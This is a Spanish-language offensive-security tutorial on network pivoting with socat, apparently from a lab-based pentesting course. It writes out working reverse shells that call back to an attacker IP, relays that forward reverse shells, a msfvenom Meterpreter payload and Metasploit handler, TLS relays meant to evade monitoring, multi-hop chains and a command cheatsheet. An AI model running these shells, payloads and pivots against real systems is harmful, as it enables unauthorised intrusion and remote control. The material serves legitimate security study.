
## 🧠 Concepto clave

**Chisel** y **Socat** son las dos herramientas de pivoting más versátiles del toolkit ofensivo cuando no se puede depender de SSH o Metasploit. Aunque ambas crean túneles de red, operan con filosofías distintas:

| Herramienta | Filosofía                          | Transporte                  | Caso de uso principal                                          |
| ----------- | ---------------------------------- | --------------------------- | -------------------------------------------------------------- |
| **socat**   | Relay TCP/UDP puro bidireccional   | TCP, UDP, TLS, Unix sockets | Redirector simple, shells interactivas, relay de un solo salto |
| **chisel**  | Túnel TCP/UDP sobre HTTP/WebSocket | HTTP o HTTPS (WebSocket)    | Túnel persistente con SOCKS5, multi-hop, firewall bypass       |

La diferencia operativa clave: socat **reenvía** tráfico entre dos endpoints ya establecidos, mientras que chisel **tuneliza** tráfico encapsulándolo en HTTP/WebSocket — lo que permite atravesar firewalls que bloquean TCP arbitrario pero permiten HTTP/HTTPS saliente.

---

## 📌 SOCAT — Socket CAT

### Instalación y transferencia

> [!info] **socat** 📄 [socat — Linux man page](https://linux.die.net/man/1/socat)
> Herramienta Unix para crear conexiones bidireccionales entre dos flujos de datos de cualquier tipo: sockets TCP/UDP, archivos, pipes, pseudo-terminales, procesos, etc. La sintaxis siempre es `socat DIRECCIÓN1 DIRECCIÓN2` — socat conecta ambas direcciones y retransmite los datos en ambas direcciones simultáneamente. Es la navaja suiza del relay de red.

> [!tip] Instalar socat o transferirlo como binario estático
> ```bash
> # Instalar en sistemas con apt
> sudo apt install socat
>
> # Descargar binario estático precompilado para transferir a pivots sin acceso a apt
> wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
> chmod +x socat
>
> # Transferir al pivot con scp
> scp socat ubuntu@10.129.202.64:/tmp/socat
>
> # Transferir con servidor HTTP
> python3 -m http.server 8000
> # En el pivot:
> wget http://10.10.14.18:8000/socat -O /tmp/socat && chmod +x /tmp/socat
> ```

---

### Sintaxis general de socat
```
socat [opciones] DIRECCIÓN1 DIRECCIÓN2
```

Cada dirección sigue el formato: `PROTOCOLO:HOST:PUERTO[,opciones]`

**Tipos de dirección más comunes:**

| Tipo | Sintaxis | Descripción |
|---|---|---|
| Escuchar TCP | `TCP4-LISTEN:PUERTO` | Espera conexiones entrantes en PUERTO |
| Conectar TCP | `TCP4:HOST:PUERTO` | Conecta activamente a HOST:PUERTO |
| Escuchar UDP | `UDP4-LISTEN:PUERTO` | Escucha UDP en PUERTO |
| Conectar UDP | `UDP4:HOST:PUERTO` | Envía UDP a HOST:PUERTO |
| Shell | `EXEC:/bin/bash` | Ejecuta un proceso y conecta sus streams |
| Pseudo-terminal | `PTY` | Crea una pseudo-terminal |
| Stdin/Stdout | `STDIO` | Usa la entrada/salida estándar |
| TLS listener | `OPENSSL-LISTEN:PUERTO,cert=archivo.pem` | Escucha con TLS |
| TLS connect | `OPENSSL:HOST:PUERTO,verify=0` | Conecta con TLS (sin verificar cert) |

**Opciones de dirección más importantes:**

| Opción | Función |
|---|---|
| `fork` | Crea un proceso hijo por cada conexión — permite múltiples clientes simultáneos |
| `reuseaddr` | Permite reusar el puerto inmediatamente después de cerrarse (evita "Address already in use") |
| `verify=0` | Deshabilita la verificación del certificado TLS |
| `pty` | Asigna pseudo-terminal — necesario para shells interactivas |
| `stderr` | Redirige stderr al canal de datos |
| `setsid` | Crea nueva sesión de proceso (detach del terminal de control) |
| `sane` | Normaliza la configuración del terminal |

---

### Caso de uso 1 — Redirector TCP simple (pivoting básico)

**Escenario:** el atacante quiere alcanzar el puerto RDP (`3389`) de `172.16.5.19` (Windows interno). Solo puede llegar al Ubuntu pivot (`10.129.202.64`). Se usa socat en el Ubuntu para redirigir el tráfico.
```
[Atacante] → [Ubuntu:3389] → socat → [Windows:3389]
```

**Paso 1 — Lanzar el redirector en el pivot:**

> [!tip] Redirector socat TCP hacia el host interno
> ```bash
> # En el Ubuntu pivot
> socat TCP4-LISTEN:3389,fork,reuseaddr TCP4:172.16.5.19:3389
> ```
> `TCP4-LISTEN:3389` — Escuchar conexiones TCP entrantes en el puerto 3389 del pivot.
> `fork` — Proceso hijo por conexión — permite múltiples sesiones RDP simultáneas.
> `reuseaddr` — Reusar el puerto si socat se reinicia inmediatamente.
> `TCP4:172.16.5.19:3389` — Reenviar todo lo que llegue hacia el Windows interno en su puerto RDP.

**Paso 2 — Conectar desde el atacante:**

> [!tip] Conectar al servicio interno a través del redirector socat
> ```bash
> # Desde el atacante — conectar al pivot que redirige al Windows
> xfreerdp /v:10.129.202.64:3389 /u:victor /p:pass@123
>
> # O con rdesktop
> rdesktop 10.129.202.64:3389
> ```

---

### Caso de uso 2 — Redirector para reverse shell (pivoting ofensivo)

**Escenario:** se quiere recibir una reverse shell del Windows interno (`172.16.5.19`). El Windows no puede alcanzar al atacante directamente — solo ve la red `172.16.5.0/23`. Se usa socat en el Ubuntu como relay.
```
[Windows] → payload apunta a [Ubuntu:8080] → socat → [Atacante:80] → MSF handler
```

**Paso 1 — Lanzar el redirector en el pivot:**

> [!tip] Redirector socat para reverse shell — pivot escucha y reenvía al atacante
> ```bash
> # En el Ubuntu pivot
> socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
> ```
> `TCP4-LISTEN:8080` — El payload del Windows conectará aquí.
> `TCP4:10.10.14.18:80` — Todo lo recibido se reenvía al atacante en el puerto 80.

**Paso 2 — Listener en el atacante:**

> [!tip] Handler de Metasploit esperando la sesión reenviada por socat
> ```bash
> msfconsole -q
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_https
> set LHOST 0.0.0.0
> set LPORT 80
> run
> ```

**Paso 3 — Generar payload apuntando al pivot (no al atacante):**

> [!tip] Payload msfvenom con LHOST del pivot, LPORT del socat listener
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_https \
>     LHOST=172.16.5.129 \
>     LPORT=8080 \
>     -f exe -o shell.exe
> ```
> `LHOST=172.16.5.129` — IP del pivot Ubuntu en la red interna — a donde conecta el Windows.
> `LPORT=8080` — Puerto donde socat escucha en el pivot.

---

### Caso de uso 3 — Shell inversa TTY completa con socat

Socat puede crear reverse shells mucho más funcionales que `bash -i` o `nc` porque soporta pseudo-terminales nativas.

**En el atacante — listener socat:**

> [!tip] Listener socat para recibir shell TTY completa
> ```bash
> socat TCP4-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
> ```
> `FILE:\`tty\`` — Usa el terminal actual del atacante como interfaz de la shell.
> `raw` — Modo raw: envía todos los caracteres directamente, incluyendo Ctrl+C, flechas, etc.
> `echo=0` — Deshabilita el eco local (evita ver doble cada carácter).

**En el objetivo — conectar de vuelta:**

> [!tip] Reverse shell socat con pseudo-terminal completa
> ```bash
> socat TCP4:10.10.14.18:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
> ```
> `TCP4:10.10.14.18:4444` — Conectar al listener del atacante.
> `EXEC:/bin/bash` — Ejecutar bash y conectar sus streams al socket.
> `pty` — Pseudo-terminal: da soporte completo a vim, top, bash completion, historial.
> `stderr` — Redirige stderr al canal — se ven los errores.
> `setsid` — Nueva sesión: desasocia del terminal de control.
> `sigint` — Permite Ctrl+C sin matar la shell.
> `sane` — Configuración terminal sana: `stty sane` automático.

La shell resultante es completamente interactiva: flechas, Ctrl+C, tab completion, vim, todo funciona sin necesitar el tratamiento manual `python3 -c 'import pty'` + `stty`.

---

### Caso de uso 4 — Redirector con cifrado TLS

Cuando la red monitoriza tráfico TCP plano, socat puede cifrar el canal con TLS.

**Paso 1 — Generar certificado autofirmado en el pivot:**

> [!tip] Generar certificado TLS para socat
> ```bash
> # En el pivot o el atacante
> openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 365 -out socat.crt \
>     -subj "/CN=socat"
> cat socat.key socat.crt > socat.pem
> ```
> `req -newkey rsa:2048` — Genera clave RSA de 2048 bits y solicitud de certificado en un paso.
> `-nodes` — Sin passphrase en la clave privada (necesario para uso automatizado).
> `-x509` — Genera certificado autofirmado directamente (no una CSR).
> `-days 365` — Validez de 365 días.
> `cat socat.key socat.crt > socat.pem` — Combina clave y certificado en un solo archivo PEM — formato que necesita socat.

**Paso 2 — Listener TLS en el pivot:**

> [!tip] Redirector socat con TLS — el tráfico entre objetivo y pivot viaja cifrado
> ```bash
> socat OPENSSL-LISTEN:8080,cert=socat.pem,verify=0,fork TCP4:10.10.14.18:80
> ```
> `OPENSSL-LISTEN:8080` — Escuchar con TLS en el puerto 8080.
> `cert=socat.pem` — Archivo PEM con certificado + clave privada.
> `verify=0` — No verificar el certificado del cliente (sin CA configurada).
> `fork` — Múltiples conexiones simultáneas.
> `TCP4:10.10.14.18:80` — Reenviar el tráfico descifrado al atacante en TCP plano.

**Paso 3 — Payload o cliente conectando con TLS:**

> [!tip] Cliente socat que conecta con TLS al pivot
> ```bash
> socat TCP4:127.0.0.1:LOCAL_PORT OPENSSL:10.129.202.64:8080,verify=0
> ```

---

### Caso de uso 5 — Multi-hop con socat encadenado

**Escenario:** tres redes encadenadas. El atacante solo ve la red A. El pivot A ve las redes A y B. El pivot B ve las redes B y C. Se quiere llegar a la red C.
```
[Atacante] → [Pivot A:8080] → socat → [Pivot B:9090] → socat → [Target C:3389]
```

> [!tip] socat encadenado — primer pivot
> ```bash
> # En Pivot A (conectado al atacante y a Pivot B)
> socat TCP4-LISTEN:8080,fork TCP4:PIVOT_B_IP:9090
> ```

> [!tip] socat encadenado — segundo pivot
> ```bash
> # En Pivot B (conectado a Pivot A y a Target C)
> socat TCP4-LISTEN:9090,fork TCP4:TARGET_C_IP:3389
> ```

> [!tip] Conexión final desde el atacante a través de la cadena
> ```bash
> # Desde el atacante — conectar a Pivot A que encadena hasta Target C
> xfreerdp /v:PIVOT_A_IP:8080 /u:administrador /p:Password123
> ```

---

### Resumen de comandos socat más usados

> [!tip] Cheatsheet rápido de socat para pivoting
> ```bash
> # Redirector TCP simple
> socat TCP4-LISTEN:LPORT,fork TCP4:DESTINO_IP:DESTINO_PUERTO
>
> # Redirector en background
> socat TCP4-LISTEN:LPORT,fork TCP4:DESTINO_IP:DESTINO_PUERTO &
>
> # Redirector UDP
> socat UDP4-LISTEN:LPORT,fork UDP4:DESTINO_IP:DESTINO_PUERTO
>
> # Reverse shell TTY completa — listener
> socat TCP4-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0
>
> # Reverse shell TTY completa — cliente (en el objetivo)
> socat TCP4:ATACANTE:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
>
> # Redirector TLS
> socat OPENSSL-LISTEN:LPORT,cert=socat.pem,verify=0,fork TCP4:ATACANTE:PUERTO
>
> # Transferir archivo — emisor
> socat TCP4-LISTEN:4444,reuseaddr OPEN:archivo.txt
>
> # Transferir archivo — receptor
> socat TCP4:EMISOR_IP:4444 OPEN:recibido.txt,create
>
> # Verificar socat activo
> ss -tulnp | grep socat
> netstat -antp | grep socat
> ```
